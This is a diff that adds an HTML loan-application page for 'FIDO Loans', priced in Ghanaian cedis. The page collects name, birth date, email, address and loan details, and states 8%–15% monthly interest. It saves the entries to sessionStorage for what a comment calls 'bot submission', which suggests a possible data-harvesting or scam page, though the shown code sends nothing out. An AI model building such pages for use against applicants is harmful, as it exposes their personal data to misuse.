@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loan Application – FIDO Loans</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --pink:  #e8195a;
+      --green: #4caf91;
+      --green2:#3d9e80;
+      --text:  #1a1a2e;
+      --muted: #666;
+      --border:#d8d8d8;
+      --bg:    #f9f9f9;
+    }
+
+    body { font-family:'Nunito',sans-serif; background:var(--bg); color:var(--text); }
+
+    header {
+      display:flex; align-items:center;
+      background:var(--pink); height:64px; padding:0 16px;
+    }
+    .logo-box {
+      width:48px;height:48px;background:rgba(255,255,255,.2);
+      border-radius:8px;display:flex;align-items:center;justify-content:center;
+    }
+    .logo-box svg{width:28px;height:28px;fill:#fff;}
+    header h1 {
+      flex:1;text-align:center;color:#fff;
+      font-size:1.4rem;font-weight:800;letter-spacing:2px;margin-right:48px;
+    }
+
+    main { max-width:520px; margin:0 auto; padding:32px 16px 80px; }
+    h2 { font-size:1.3rem; font-weight:800; color:var(--green); }
+    .sub { font-size:.88rem; color:var(--muted); margin:4px 0 24px; }
+
+    .field { margin-bottom:20px; }
+    label.field-label {
+      display:block; font-size:.85rem; font-weight:700;
+      color:var(--text); margin-bottom:6px;
+    }
+    input[type=text], input[type=email], input[type=date],
+    input[type=number], select, input[type=tel] {
+      width:100%; padding:12px 14px;
+      border:1px solid var(--border); border-radius:8px;
+      font-family:inherit; font-size:.93rem; color:var(--text);
+      background:#fff; outline:none; transition:border .2s;
+    }
+    input:focus, select:focus { border-color:var(--green); }
+    select { appearance:auto; cursor:pointer; }
+
+    /* interest notice */
+    .interest-note {
+      font-size:.82rem; color:var(--muted);
+      margin-top:4px; padding-left:2px;
+    }
+    .interest-note strong { color:var(--text); }
+
+    /* checkboxes */
+    .check-row {
+      display:flex; align-items:flex-start; gap:10px;
+      font-size:.88rem; color:#444; cursor:pointer; margin-bottom:16px;
+    }
+    .check-row input[type=checkbox] {
+      width:18px;height:18px;flex-shrink:0;margin-top:2px;
+      accent-color:var(--green); cursor:pointer;
+    }
+
+    .btn {
+      display:block; width:100%; padding:15px; border:none; border-radius:8px;
+      font-family:inherit; font-size:1rem; font-weight:700; cursor:pointer;
+      transition:background .2s,opacity .2s,transform .1s;
+    }
+    .btn-primary { background:var(--green); color:#fff; }
+    .btn-primary:hover:not(:disabled){ background:var(--green2); transform:translateY(-1px); }
+    .btn-primary:disabled{ opacity:.55; cursor:not-allowed; }
+
+    /* toast */
+    #toast {
+      position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
+      background:#333;color:#fff;padding:10px 22px;border-radius:20px;
+      font-size:.85rem;opacity:0;transition:opacity .3s;pointer-events:none;
+    }
+    #toast.show{opacity:1;}
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="logo-box">
+    <svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9z"/></svg>
+  </div>
+  <h1>FIDO LOANS</h1>
+</header>
+
+<main>
+  <h2>Loan Application</h2>
+  <p class="sub">Provide your personal details</p>
+
+  <div class="field">
+    <label class="field-label" for="fullname">Full name</label>
+    <input type="text" id="fullname" placeholder="Your full name" required>
+  </div>
+
+  <div class="field">
+    <label class="field-label" for="dob">Date of birth</label>
+    <input type="date" id="dob" required>
+  </div>
+
+  <div class="field">
+    <label class="field-label" for="email">Email address</label>
+    <input type="email" id="email" placeholder="you@email.com" required>
+  </div>
+
+  <div class="field">
+    <label class="field-label" for="address">Residential address</label>
+    <input type="text" id="address" placeholder="Street, City, Region" required>
+  </div>
+
+  <div class="field">
+    <label class="field-label" for="employment">Employment status</label>
+    <select id="employment" required>
+      <option value="">Select</option>
+      <option>Employed</option>
+      <option>Self-employed</option>
+      <option>Unemployed</option>
+      <option>Student</option>
+    </select>
+  </div>
+
+  <div class="field">
+    <label class="field-label" for="purpose">Loan purpose</label>
+    <select id="purpose" required>
+      <option value="">Select</option>
+      <option>Business</option>
+      <option>Personal</option>
+      <option>Education</option>
+      <option>Medical</option>
+      <option>Emergency</option>
+    </select>
+  </div>
+
+  <div class="field">
+    <label class="field-label" for="amount">Loan amount (GHS)</label>
+    <input type="number" id="amount" placeholder="MIN 5" min="5" step="1" required>
+  </div>
+
+  <div class="field">
+    <label class="field-label" for="term">Loan term</label>
+    <select id="term" required>
+      <option value="">Select</option>
+      <option>7 days</option>
+      <option>14 days</option>
+      <option>30 days</option>
+      <option>60 days</option>
+      <option>90 days</option>
+    </select>
+  </div>
+
+  <label class="check-row">
+    <input type="checkbox" id="terms-check">
+    I agree to the Terms and Conditions
+  </label>
+
+  <label class="check-row">
+    <input type="checkbox" id="interest-check">
+    <span>I understand loans are subject to <strong>8%–15% interest per month</strong> depending on credit score and loan amount.</span>
+  </label>
+
+  <button class="btn btn-primary" id="continue-btn" onclick="submitForm()">Continue</button>
+</main>
+
+<div id="toast">Please fill in all fields and check both boxes.</div>
+
+<script>
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3000);
+  }
+
+  function submitForm() {
+    const fields = ['fullname','dob','email','address','employment','purpose','amount','term'];
+    for (const id of fields) {
+      const el = document.getElementById(id);
+      if (!el.value.trim()) {
+        showToast('Please fill in all required fields.');
+        el.focus();
+        return;
+      }
+    }
+    if (!document.getElementById('terms-check').checked ||
+        !document.getElementById('interest-check').checked) {
+      showToast('Please check both agreement boxes.');
+      return;
+    }
+    if (parseInt(document.getElementById('amount').value) < 5) {
+      showToast('Minimum loan amount is GHS 5.');
+      return;
+    }
+
+    // Save to sessionStorage for details page & bot submission
+    const data = {
+      fullname:   document.getElementById('fullname').value,
+      dob:        document.getElementById('dob').value,
+      email:      document.getElementById('email').value,
+      address:    document.getElementById('address').value,
+      employment: document.getElementById('employment').value,
+      purpose:    document.getElementById('purpose').value,
+      amount:     document.getElementById('amount').value,
+      term:       document.getElementById('term').value,
+    };
+    sessionStorage.setItem('loanData', JSON.stringify(data));
+    window.location.href = 'details.html';
+  }
+</script>
+</body>
+</html>
